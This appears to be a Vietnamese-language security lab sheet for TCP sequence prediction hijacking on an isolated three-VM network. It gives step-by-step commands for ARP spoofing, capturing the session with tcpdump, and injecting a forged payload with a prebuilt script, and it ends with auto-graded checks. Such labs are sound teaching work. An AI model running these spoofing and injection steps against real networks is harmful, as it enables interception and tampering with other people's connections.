BAI LAB: TCP SEQUENCE PREDICTION HIJACKING
===========================================

BOI CANH
--------
He thong gom 3 may ao tren cung mot mang LAN (172.21.0.0/24):

  - victim   (172.21.0.2): mo phien TCP toi server.
  - server   (172.21.0.3): dich vu TCP echo tren cong 9999, ghi log vao
                           /var/log/session.log.
  - attacker (172.21.0.4): may cua ban, co san scapy, tcpdump va script
                           arp-poison / pred-hijack.py.

MUC TIEU
--------
Doan so sequence tiep theo cua victim va chen mot goi tin du lieu gia mao
vao phien TCP. Khac voi RST, cach nay chen du lieu vao phien dang mo.

BUOC 1 - ARP spoofing
---------------------
Tren attacker:

    cd ~/.local/bin
    sudo nohup ./arp-poison eth0 >/tmp/arp.log 2>&1 < /dev/null &
    disown

Kiem tra tren victim:

    ip neigh | grep 172.21.0.3

Dia chi 172.21.0.3 phai tro toi MAC cua attacker: 02:42:ac:15:00:04.

BUOC 2 - Mo phien TCP
---------------------
Tren victim:

    start-session

Go HELLO roi Enter de server ghi nhan du lieu. Giu terminal nay mo.

BUOC 3 - Sniff phien
--------------------
Tren attacker:

    sudo tcpdump -Z root -U -n -w ~/session.pcap 'tcp port 9999'

Doc capture:

    sudo tcpdump -nn -r ~/session.pcap

Xac dinh:
    - SEQ cuoi cung cua victim
    - ACK hien tai cua server
    - cong nguon (sport) cua victim
    - do dai payload victim da gui (vi du HELLO\n = 6 byte)

BUOC 4 - Doan SEQ va chen du lieu
---------------------------------
Tren attacker:

    sudo python3 pred-hijack.py <seq> <ack> <sport> <payload_len>

Script tinh next_seq = seq + payload_len va gui payload HIJACKED.
Vi du:

    sudo python3 pred-hijack.py 2452713155 4262428 48844 6

BUOC 5 - Kiem tra
-----------------
Tren server:

    sudo cat /var/log/session.log

Phai thay dong RECV HIJACKED va ACK:HIJACKED.

KIEM TRA KET QUA
----------------
Tu Linux host, chay:

    checkwork

4 checkwork:
    cw_tcp_session   - server da nhan du lieu HELLO
    cw_tcp_injected  - server da nhan du lieu HIJACKED
    cw_tcp_acked     - server da tra ACK cho du lieu chen
    cw_arp_spoof     - ARP cua victim tro toi MAC attacker

KET THUC
--------
    stoplab

Luu y: neu SEQ doan sai, server se tra ve ACK trung lap va bo qua payload.
